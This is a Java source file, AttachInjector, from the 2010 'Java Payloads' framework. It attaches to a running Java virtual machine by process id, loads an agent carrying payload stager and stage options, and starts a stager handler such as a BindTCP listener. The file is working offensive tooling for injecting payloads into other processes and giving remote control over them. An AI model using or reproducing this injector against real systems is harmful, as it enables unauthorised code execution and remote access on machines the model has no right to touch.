/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import javapayload.handler.stager.StagerHandler;

import com.sun.tools.attach.VirtualMachine;

public class AttachInjector {
	public static void main(String[] args) throws Exception {
		if (args.length < 5) {
			System.out.println("Usage: java javapayload.builder.AttachInjector <pid> <agentPath> <stager> [stageroptions] -- <stage> [stageoptions]");
			return;
		}
		final String[] stagerArgs = new String[args.length - 2];
		final StringBuffer agentArgs = new StringBuffer();
		final String stager = args[2];
		for (int i = 2; i < args.length; i++) {
			if (i != 1) {
				agentArgs.append(" ");
			}
			agentArgs.append(args[i]);
			stagerArgs[i - 2] = args[i];
		}

		boolean loadStagerLater = false;
		if (stager.equals("BindTCP")) {
			loadStagerLater = true;
		} else {
			new Thread(new Runnable() {
				public void run() {
					try {
						StagerHandler.main(stagerArgs);
					} catch (final Exception ex) {
						ex.printStackTrace();
					}
				}
			}).start();
		}

		final VirtualMachine vm = VirtualMachine.attach(args[0]);
		vm.loadAgent(args[1], agentArgs.toString());
		vm.detach();

		if (loadStagerLater) {
			StagerHandler.main(stagerArgs);
		}
	}
}
